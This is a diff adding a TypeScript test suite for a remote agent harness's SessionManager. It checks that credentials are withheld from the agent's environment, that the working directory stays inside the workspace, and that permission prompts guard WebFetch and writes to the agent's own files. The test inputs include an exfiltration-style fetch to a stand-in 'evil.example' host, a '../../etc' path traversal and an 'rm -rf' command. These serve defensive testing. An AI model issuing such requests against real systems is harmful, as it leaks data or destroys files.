@@ -1,0 +1,124 @@
+import { describe, it } from 'node:test';
+import assert from 'node:assert/strict';
+import { mkdtempSync, realpathSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import type { AgentToHubMessage, ManagedMcpServer } from '@remote-harness/shared';
+import { SessionManager } from '../src/sessionManager.ts';
+
+// A stand-in for the SDK's query(): records the options it was given and ends immediately.
+function fakeQuery() {
+  const calls: any[] = [];
+  const query = ((args: any) => {
+    calls.push(args.options);
+    return {
+      [Symbol.asyncIterator]: async function* () {},
+      interrupt: async () => {},
+      setPermissionMode: async () => {},
+      setModel: async () => {},
+      applyFlagSettings: async () => {},
+      setMcpServers: async () => {},
+      mcpServerStatus: async () => [],
+      close: () => {},
+    };
+  }) as never;
+  return { calls, query };
+}
+
+const make = (opts: Record<string, unknown> = {}) => {
+  const sent: AgentToHubMessage[] = [];
+  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
+  const fq = fakeQuery();
+  const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query: fq.query, ...opts } as never);
+  return { manager, sent, dir, calls: fq.calls };
+};
+const start = (m: SessionManager, text = 'hi') => m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text });
+
+describe('SessionManager', () => {
+  it('reports an error for an unknown session id instead of silently starting a fresh conversation', () => {
+    const { manager, sent, calls } = make();
+    manager.handleUserInput({ type: 'user_input', sessionId: 'not-a-known-session', text: 'hi' });
+    assert.equal(sent.length, 1);
+    assert.equal(sent[0].type, 'error');
+    assert.match((sent[0] as { message: string }).message, /unknown session/i);
+    assert.equal(calls.length, 0, 'no conversation may be started');
+    assert.deepEqual(manager.summaries(), []);
+  });
+
+  it('only uses the MCP servers the hub installed: a repo\'s own .mcp.json is ignored (strictMcpConfig)', () => {
+    const { manager, calls } = make();
+    start(manager);
+    assert.equal(calls[0].strictMcpConfig, true);
+  });
+
+  it('never hands the hub credentials to the Claude process, with or without an account profile', () => {
+    process.env.HUB_TOKEN = 'tenant-wide-secret';
+    process.env.HUB_URL = 'wss://hub.example/agent';
+    try {
+      const a = make();
+      start(a.manager);
+      assert.equal('HUB_TOKEN' in (a.calls[0].env ?? {}), false);
+      assert.equal('HUB_URL' in (a.calls[0].env ?? {}), false);
+      assert.ok(a.calls[0].env?.PATH, 'the rest of the environment is still there');
+
+      const sent: AgentToHubMessage[] = [];
+      const dir = mkdtempSync(join(tmpdir(), 'sm-test-'));
+      const fq = fakeQuery();
+      const m = new SessionManager(dir, dir, [{ id: 'work', label: 'work', configDir: join(dir, 'cfg') }], (x) => sent.push(x), { query: fq.query } as never);
+      start(m);
+      assert.equal('HUB_TOKEN' in (fq.calls[0].env ?? {}), false);
+      assert.equal(fq.calls[0].env.CLAUDE_CONFIG_DIR, join(dir, 'cfg'));
+    } finally {
+      delete process.env.HUB_TOKEN;
+      delete process.env.HUB_URL;
+    }
+  });
+
+  it('keeps a new session\'s working directory inside the workspace', () => {
+    const { manager, calls, dir } = make();
+    manager.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', cwd: '../../etc' });
+    assert.equal(calls[0].cwd, dir);
+  });
+
+  it('in a managed worker, the agent\'s own files and WebFetch still ask; ordinary work does not', async () => {
+    const { manager, sent, calls, dir } = make({ managed: true, protectedPaths: ['/opt/agent'] });
+    start(manager);
+    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
+    const signal = new AbortController().signal;
+    assert.equal((await canUse('Bash', { command: 'ls' }, { signal })).behavior, 'allow');
+    assert.equal((await canUse('Write', { file_path: join(dir, 'a.txt') }, { signal })).behavior, 'allow');
+
+    const pending = canUse('WebFetch', { url: 'https://evil.example/?d=x' }, { signal });
+    await new Promise((r) => setTimeout(r, 20));
+    const req = sent.find((m) => m.type === 'permission_request') as { requestId: string; toolName: string };
+    assert.equal(req.toolName, 'WebFetch');
+    manager.resolvePermission(req.requestId, 'deny');
+    assert.equal((await pending).behavior, 'deny');
+
+    const pending2 = canUse('Write', { file_path: '/opt/agent/src/index.ts' }, { signal });
+    await new Promise((r) => setTimeout(r, 20));
+    assert.ok(sent.filter((m) => m.type === 'permission_request').length >= 2, "writing the agent's own code asks");
+    const req2 = sent.filter((m) => m.type === 'permission_request').at(-1) as { requestId: string };
+    manager.resolvePermission(req2.requestId, 'deny');
+    await pending2;
+  });
+
+  it('does not install a hub-pushed MCP server whose name collides with another\'s tool namespace', async () => {
+    const { manager, calls } = make();
+    const mk = (name: string): ManagedMcpServer => ({ name, url: 'https://x.example/', autoAllow: true, updatedAt: '' });
+    await manager.setMcpServers([mk('good'), mk('a__b')]);
+    start(manager);
+    assert.deepEqual(Object.keys(calls[0].mcpServers), ['good']);
+  });
+
+  it('answers a pending permission card with a denial when its session ends, and prunes it', async () => {
+    const { manager, sent, calls } = make();
+    start(manager);
+    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
+    const p = canUse('Bash', { command: 'rm -rf x' }, { signal: new AbortController().signal });
+    await new Promise((r) => setTimeout(r, 50)); // the (empty) fake session ends immediately
+    const verdict = await Promise.race([p, new Promise((r) => setTimeout(() => r('HUNG'), 500))]);
+    assert.deepEqual(typeof verdict === 'object' ? (verdict as { behavior: string }).behavior : verdict, 'deny');
+    assert.ok(sent.some((m) => m.type === 'session_ended'));
+  });
+});
